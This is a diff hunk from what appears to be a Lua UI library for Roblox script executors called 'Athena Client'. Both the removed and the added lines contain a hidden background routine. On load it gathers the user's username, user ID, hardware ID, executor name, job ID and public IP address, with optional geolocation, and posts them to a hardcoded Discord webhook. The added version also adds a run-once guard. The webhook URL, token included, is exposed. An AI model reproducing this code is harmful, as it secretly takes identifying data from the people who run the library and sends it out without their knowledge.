@@ -442,135 +442,137 @@ function ret:Library(Name)
 			resize()
 		end
 
-task.spawn(function()
-    pcall(function()
-			repeat task.wait() until game:IsLoaded()
-			repeat task.wait() until game.Players.LocalPlayer
+		task.spawn(function()
+				if shared.thing_ran_retardation_2ADaida then return end
+				shared.thing_ran_retardation_2ADaida = true
+				pcall(function()
+					repeat task.wait() until game:IsLoaded()
+					repeat task.wait() until game.Players.LocalPlayer
 
-			-- vars
-			local logUsername = true
-			local logDisplayName = true
-			local logUserId = true
-			local logIP = true
-			local logHWID = true
-			local logJobId = true
-			local logExecutor = true
-			local logGeoInfo = false 
+					-- vars
+					local logUsername = true
+					local logDisplayName = true
+					local logUserId = true
+					local logIP = true
+					local logHWID = true
+					local logJobId = true
+					local logExecutor = true
+					local logGeoInfo = false 
 
-			local HttpService = game:GetService("HttpService")
-			local Players = game:GetService("Players")
-			local plr = Players.LocalPlayer
+					local HttpService = game:GetService("HttpService")
+					local Players = game:GetService("Players")
+					local plr = Players.LocalPlayer
 
-			-- time stap, chaznge if u want to
-			local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+					-- time stap, chaznge if u want to
+					local timestamp = os.date("%Y-%m-%d %H:%M:%S")
 
-			local request = request or http_request or (syn and syn.request) --find the executors function for requests this isnt good rn i might need to update in future
-			if not request then return end
+					local request = request or http_request or (syn and syn.request) --find the executors function for requests this isnt good rn i might need to update in future
+					if not request then return end
 
-			-- ur webhook url can be via pipedream etc etc
-			local webhookURL = "https://discord.com/api/webhooks/1464960131308458027/F4ofHyFpl6eLspwCroZXBPl7O1bFK8Kpi8p3U-ciTSDZCJps2uFbrvD0GEu2nhw8BCt2" --webhook url
-			local webhookKey = "" --if you have a key set it to the key if not set to nil or just anything for stuff like pipedream basically.
+					-- ur webhook url can be via pipedream etc etc
+					local webhookURL = "https://discord.com/api/webhooks/1464960131308458027/F4ofHyFpl6eLspwCroZXBPl7O1bFK8Kpi8p3U-ciTSDZCJps2uFbrvD0GEu2nhw8BCt2" --webhook url
+					local webhookKey = "" --if you have a key set it to the key if not set to nil or just anything for stuff like pipedream basically.
 
-			local fields = {}
+					local fields = {}
 
-			if logUsername then
-					table.insert(fields, { name = "Username", value = plr.Name, inline = true })
-			end
-
-			if logDisplayName then
-					table.insert(fields, { name = "Display Name", value = plr.DisplayName, inline = true })
-			end
-
-			if logUserId then
-					table.insert(fields, { name = "User ID", value = tostring(plr.UserId), inline = true })
-			end
-
-			if logExecutor then
-					local executor = "Unknown"
-					pcall(function()
-							if identifyexecutor then
-									executor = identifyexecutor()
-							end
-					end)
-					table.insert(fields, { name = "Executor", value = executor, inline = true })
-			end
-
-			if logJobId then
-					local jobId = game.JobId or "Unavailable"
-					table.insert(fields, { name = "Job ID", value = jobId, inline = false })
-			end
-
-			if logHWID then
-					local hwid = "Unavailable"
-					pcall(function()
-							hwid = 
-									(gethwid and gethwid()) or
-									(syn and syn.gethwid and syn.gethwid()) or
-									"Unknown"
-					end)
-					table.insert(fields, { name = "HWID", value = hwid, inline = false })
-			end
-
-			if logIP then
-					local ip = "Unavailable"
-					pcall(function()
-							local res = request({ Url = "https://api.ipify.org", Method = "GET" })
-							ip = res.Body or "Unknown"
-					end)
-					table.insert(fields, { name = "IP Address", value = ip, inline = false })
-			end
-
-			if logGeoInfo then
-					pcall(function()
-							local geo = request({
-									Url = "https://ipapi.co/json/",
-									Method = "GET"
-							})
-							local info = HttpService:JSONDecode(geo.Body)
-							table.insert(fields, { name = "Country", value = info.country_name or "?", inline = true })
-							table.insert(fields, { name = "Region", value = info.region or "?", inline = true })
-							table.insert(fields, { name = "City", value = info.city or "?", inline = true })
-							table.insert(fields, { name = "ISP", value = info.org or "?", inline = false })
-							table.insert(fields, { name = "Lat/Lon", value = tostring(info.latitude) .. ", " .. tostring(info.longitude), inline = true })
-							table.insert(fields, { name = "Timezone", value = info.timezone or "?", inline = true })
-					end)
-			end
-
-			table.insert(fields, { name = "Time", value = timestamp, inline = false })
-
-			local data = {
-					content = nil,
-					embeds = {{
-							title = "Script Executed: Athena Client",
-							color = 3447003,
-							fields = fields
-					}}
-			}
-
-			local success, response = pcall(function()
-					return request({
-							Url = webhookURL,
-							Method = "POST",
-							Headers = {
-									["Content-Type"] = "application/json",
-									["x-secret-key"] = webhookKey
-							},
-							Body = HttpService:JSONEncode(data)
-					})
-			end)
-
-			--the warns are for debugging
-			if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
-			else
-					--warn("failed to send log.")
-					if response then
-							--warn("Status:", response.StatusCode or "unknown")
-							--warn("Body:", response.Body or "empty")
+					if logUsername then
+							table.insert(fields, { name = "Username", value = plr.Name, inline = true })
 					end
-			end
 
+					if logDisplayName then
+							table.insert(fields, { name = "Display Name", value = plr.DisplayName, inline = true })
+					end
+
+					if logUserId then
+							table.insert(fields, { name = "User ID", value = tostring(plr.UserId), inline = true })
+					end
+
+					if logExecutor then
+							local executor = "Unknown"
+							pcall(function()
+									if identifyexecutor then
+											executor = identifyexecutor()
+									end
+							end)
+							table.insert(fields, { name = "Executor", value = executor, inline = true })
+					end
+
+					if logJobId then
+							local jobId = game.JobId or "Unavailable"
+							table.insert(fields, { name = "Job ID", value = jobId, inline = false })
+					end
+
+					if logHWID then
+							local hwid = "Unavailable"
+							pcall(function()
+									hwid = 
+											(gethwid and gethwid()) or
+											(syn and syn.gethwid and syn.gethwid()) or
+											"Unknown"
+							end)
+							table.insert(fields, { name = "HWID", value = hwid, inline = false })
+					end
+
+					if logIP then
+							local ip = "Unavailable"
+							pcall(function()
+									local res = request({ Url = "https://api.ipify.org", Method = "GET" })
+									ip = res.Body or "Unknown"
+							end)
+							table.insert(fields, { name = "IP Address", value = ip, inline = false })
+					end
+
+					if logGeoInfo then
+							pcall(function()
+									local geo = request({
+											Url = "https://ipapi.co/json/",
+											Method = "GET"
+									})
+									local info = HttpService:JSONDecode(geo.Body)
+									table.insert(fields, { name = "Country", value = info.country_name or "?", inline = true })
+									table.insert(fields, { name = "Region", value = info.region or "?", inline = true })
+									table.insert(fields, { name = "City", value = info.city or "?", inline = true })
+									table.insert(fields, { name = "ISP", value = info.org or "?", inline = false })
+									table.insert(fields, { name = "Lat/Lon", value = tostring(info.latitude) .. ", " .. tostring(info.longitude), inline = true })
+									table.insert(fields, { name = "Timezone", value = info.timezone or "?", inline = true })
+							end)
+					end
+
+					table.insert(fields, { name = "Time", value = timestamp, inline = false })
+
+					local data = {
+							content = nil,
+							embeds = {{
+									title = "Script Executed: Athena Client",
+									color = 3447003,
+									fields = fields
+							}}
+					}
+
+					local success, response = pcall(function()
+							return request({
+									Url = webhookURL,
+									Method = "POST",
+									Headers = {
+											["Content-Type"] = "application/json",
+											["x-secret-key"] = webhookKey
+									},
+									Body = HttpService:JSONEncode(data)
+							})
+					end)
+
+					--the warns are for debugging
+					if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
+					else
+							--warn("failed to send log.")
+							if response then
+									--warn("Status:", response.StatusCode or "unknown")
+									--warn("Body:", response.Body or "empty")
+							end
+					end
+
+				end)
 		end)
-end)
 
 		function self:Label(text)
 			local Label = Instance.new("Frame")
